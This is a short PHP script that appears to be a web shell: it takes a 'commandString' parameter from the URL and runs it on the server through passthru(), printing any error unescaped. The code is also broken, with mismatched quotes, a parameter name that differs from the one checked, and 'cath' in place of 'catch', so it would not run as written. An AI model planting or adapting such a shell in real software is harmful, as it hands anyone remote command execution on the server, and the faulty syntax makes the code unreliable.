<?php

   if(isset($_GET["commandString"]))   {
     
     $command_string =$_GET['command_String"];
     
     try {
       
       passthru($command_string);
       } cath (Error $error) {
       
       echo " <p class=mt-3><b>$error</b></p>";
       
       }
       
       }
       ?>
